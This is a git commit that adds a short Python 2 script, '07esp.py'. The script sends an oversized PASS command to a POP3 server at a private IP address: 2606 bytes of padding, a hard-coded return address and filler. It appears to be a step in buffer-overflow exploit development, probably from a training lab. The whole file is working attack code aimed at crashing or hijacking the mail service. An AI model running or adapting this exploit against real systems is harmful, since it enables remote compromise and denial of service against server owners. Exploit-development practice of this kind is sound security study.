a460c75e650daff1be717b52d017fcd48c9a04ef
lunaqueen <88500788+lunaqueen@users.noreply.github.com>
2021-11-26 10:02:06 +0800

    Create 07esp.py

---
+++ 07esp.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+buffer = "A" * 2606 + "\xe3\x41\x4b\x5f" + "C" * 390
+try:
+    print "\nSending evil buffer..."
+    s.connect(("192.168.3.104",110))
+    data = s.recv(1024)
+    print data
+    s.send("USER test"+"\r\n")
+    data = s.recv(1024)
+    print data
+    s.send("PASS " + buffer + "\r\n")
+    print "\nDone"
+    
+except:
+    print "Could not connect to POP3!"
